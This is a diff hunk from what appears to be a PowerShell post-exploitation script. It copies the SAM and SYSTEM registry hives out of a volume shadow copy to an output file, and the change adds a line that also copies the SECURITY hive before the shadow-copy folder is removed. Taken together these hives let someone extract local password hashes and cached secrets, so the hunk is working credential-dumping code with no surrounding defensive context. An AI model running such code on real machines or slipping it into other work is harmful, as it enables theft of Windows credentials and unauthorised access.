@@ -34,6 +34,7 @@ if((([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match "S
         Start-Sleep -s 1
         Copy-Item -Path "$env:SystemDrive\shadowcopy\windows\system32\config\SAM" -destination "$OutFile" -recurse
         Copy-Item -Path "$env:SystemDrive\shadowcopy\windows\system32\config\SYSTEM" -destination "$OutFile" -recurse
+        Copy-Item -Path "$env:SystemDrive\shadowcopy\windows\system32\config\SECURITY" -destination "$OutFile" -recurse
         cmd /c rmdir "$env:SystemDrive\shadowcopy"
         Start-Sleep -s 1
 
